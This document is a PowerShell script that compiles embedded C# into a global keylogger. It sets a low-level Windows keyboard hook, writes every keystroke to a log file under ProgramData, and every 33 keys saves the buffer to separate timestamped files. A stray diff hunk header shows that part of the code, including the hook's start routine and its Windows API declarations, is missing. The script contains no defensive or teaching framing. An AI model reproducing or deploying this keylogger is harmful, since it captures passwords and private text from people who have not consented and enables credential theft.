# Set log file path
$logFile = "C:\ProgramData\keylogger.log"
$scriptName = "Keylogger.ps1"

# Function to log keystrokes
function Log-Message {
    param (
        [string]$message,
        [string]$level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp [$level] [$scriptName] $message"
    Add-Content -Path $logFile -Value $logEntry
}
# Load user32.dll for key interception
$signature = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
public class KeyLogger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static IntPtr hookID = IntPtr.Zero;
    private static int wordCount = 0;
    private static string buffer = "";
    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
@@ -41,47 +49,30 @@
        UnhookWindowsHookEx(hookID);
    }
    private static IntPtr SetHook(HookProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((ConsoleKey)vkCode).ToString();
            if (key == "Spacebar") key = " ";
            if (key == "Enter") key = "\n";
            buffer += key + " ";
            wordCount++;
            // Save keystrokes to log file
            File.AppendAllText("C:\\ProgramData\\keylogger.log", key + " ");
            // Save every 33 words into a separate file
            if (wordCount >= 33) {
                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                string mrRobotFile = "C:\\ProgramData\\mrrobot_" + timestamp + ".txt";
                File.WriteAllText(mrRobotFile, buffer);
                File.AppendAllText("C:\\ProgramData\\keylogger.log", "\n[Saved to " + mrRobotFile + "]\n");
                buffer = "";
                wordCount = 0;
            }
            Console.WriteLine((ConsoleKey)vkCode);
            System.IO.File.AppendAllText("C:\\ProgramData\\keylogger.log", ((ConsoleKey)vkCode).ToString() + " ");
        }
        return CallNextHookEx(hookID, nCode, wParam, lParam);
    }
}
"@

# Compile the C# code and load it into PowerShell
Add-Type -TypeDefinition $signature -Language CSharp

# Start logging
Log-Message "Starting global keylogger."
# Start the keylogger
[KeyLogger]::Start()
